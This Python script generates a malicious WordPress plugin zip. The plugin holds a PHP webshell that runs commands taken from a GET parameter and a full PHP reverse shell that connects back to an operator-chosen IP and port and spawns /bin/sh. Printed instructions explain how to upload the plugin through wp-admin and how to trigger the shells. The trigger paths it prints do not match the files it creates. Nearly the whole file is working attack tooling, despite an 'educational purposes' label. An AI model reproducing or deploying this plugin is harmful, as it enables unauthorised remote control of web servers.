#!/usr/bin/env python3
#
# Script name     : malwordplugin.py
# Version         : 1.0
# Created date    : 1/12/2024
# Last update     : 1/12/2024
# Author          : ir1on
# Contributors    : 
# Inspired by     : malicious-wordpress-plugin
# Python version  : 3.12.7
# Description     : Generates a wordpress plugin that will grant the user a 
#                   reversshell, a webshell,
#                   without using metasploit
#
import argparse
import pathlib
import os
from random import randint 
import zipfile

def parseargs():
    """funciton to parse the cmdline args
    """
    parser = argparse.ArgumentParser(
                    prog='malwordplugin',
                    description="""creates a malicious wordpress
                    plugin with web- and remoteshell.""",
                    epilog='for educational purposes only')
    parser.add_argument('-d',
                        '--dest',
                        type=str,
                        #description="backconnect ip",
                        required=True)
    parser.add_argument('-p',
                        '--port',
                        type=int,
                        #description="backconnect port",
                        required=True)
    parser.add_argument('-l',
                        '--listner',
                        #description="should a nc listner be started",
                        action='store_true')
    parser.add_argument('-o',
                        '--output',
                        type=str,
                        #description="output path",
                        default=".")
    return parser.parse_args()


def generatewebshell():
    """creating the content of the webshell."""
    content = "<?php\n"
    content += "system($_GET['cmd']);?>\n"
    return content


def generaterevshell(dest, port):
    """creating a reverse shell with the given port and dest.

    :param dest: ip or url to connect to
    :param port: port to connect to
    :returns: reverseshell as string
    """
    php_shell = f"""<?php
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '{dest}';  // CHANGE THIS
    $port = {port};       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;

    if (function_exists('pcntl_fork')) {{
        $pid = pcntl_fork();
        if ($pid == -1) {{
            printit("ERROR: Can't fork");
            exit(1);
            }}
            if ($pid) {{
                exit(0);  // Parent exits
            }}
            if (posix_setsid() == -1) {{
                printit("Error: Can't setsid()");
                exit(1);
            }}
        $daemon = 1;
    }} else {{
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
    }}

    chdir("/");

    umask(0);

    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {{
        printit("$errstr ($errno)");
        exit(1);
    }}

    $descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {{
        printit("ERROR: Can't spawn shell");
        exit(1);
    }}

    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    printit("Successfully opened reverse shell to $ip:$port");

    while (1) {{
        if (feof($sock)) {{
            printit("ERROR: Shell connection terminated");
            break;
        }}

        if (feof($pipes[1])) {{
            printit("ERROR: Shell process terminated");
            break;
        }}

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {{
            if (($input = fread($sock, $chunk_size)) === false) {{
                break;
            }}
            fwrite($pipes[0], $input);
        }}

        if (in_array($pipes[1], $read_a)) {{
            if (($input = fread($pipes[1], $chunk_size)) === false) {{
                break;
            }}
            fwrite($sock, $input);
        }}

        if (in_array($pipes[2], $read_a)) {{
            if (($input = fread($pipes[2], $chunk_size)) === false) {{
                break;
                }}
            fwrite($sock, $input);
        }}
    }}

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

        function printit($string) {{
            if (!$daemon) {{
                print "$string\\n";
            }}
        }}
        ?>
        """
    return php_shell


def generatepluginscript():
    """generates the needed plugin script."""
    content = "<?php\n"
    content += "/**\n"
    content += " * Plugin Name: Deathworld\n"
    content += f" * Version: {randint(1,42)}.{randint(1,42)}.{randint(1,42)}\n"
    content += " * Author: humanity\n"
    content += " * Author URI: https://google.com"
    content += " * License: GPL2\n"
    content += " */\n"
    content += "?>\n"
    return content


def prepareplugin(args):
    """function to prepare the plugin files.

    :param args: arguments parsed
    """
    print("[+] started to prepare Plugin")
    # create working directory
    p = pathlib.Path("temp/")
    p.mkdir(parents=True, exist_ok=True)
    print("[+] created temporary folder")
    #store the plugin script in it
    with open("temp/Deathworld.php", 'w') as f:
        pluginscript = generatepluginscript()
        f.write(pluginscript)
    print("[+] plugin script writen")
    # store the webshell
    with open("temp/WebModule.php", 'w') as f:
        web_shell = generatewebshell()
        f.write(web_shell)
    # store reversshell
    with open("temp/RemoteModule.php", 'w') as f:
        rev_shell = generaterevshell(args.dest, args.port)
        f.write(rev_shell)


def createplugin(args):
    """zip the prepared files to a plugin zip

    :param args: aguments parsed
    """
    print("[+] Writing files to zip")
    make_zip = zipfile.ZipFile(f"{args.output}/malicious.zip", 'w')
    make_zip.write('temp/WebModule.php', 'WebModule.php')
    make_zip.write('temp/RemoteModule.php', 'RemoteModule.php')
    make_zip.write('temp/Deathworld.php', 'Deathworld.php')
    print("[+] Cleaning up files")
    os.system("rm -rf temp")
    # Useful Info
    print("[+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload")
    print("[+] How to trigger the reverse shell : ")
    print("      ->   http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php")
    print("      ->   http://(target)/wp-content/plugins/malicious/QwertyRocks.php")
    print("      ->   http://(target)/wp-content/plugins/malicious/SWebTheme.php?cmd=ls")



if __name__ == "__main__":
    args = parseargs()
    prepareplugin(args)
    createplugin(args)
